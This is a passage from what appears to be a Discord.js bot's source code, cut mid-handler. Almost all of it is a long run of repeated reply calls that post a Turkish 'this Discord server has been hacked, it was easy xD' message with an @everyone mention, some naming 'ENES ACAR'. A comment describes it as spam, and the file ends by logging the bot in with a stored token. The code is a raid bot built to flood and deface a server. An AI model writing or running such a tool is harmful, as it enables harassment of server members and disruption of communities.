        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone'); //O KANALA BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone'); //ADINDA BUSSURU MSJ ATAR +spam
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('HACKED ENES ACAR    HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('HACKED ENES ACAR    HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
    
    
  }
});

client.login(ayarlar.token);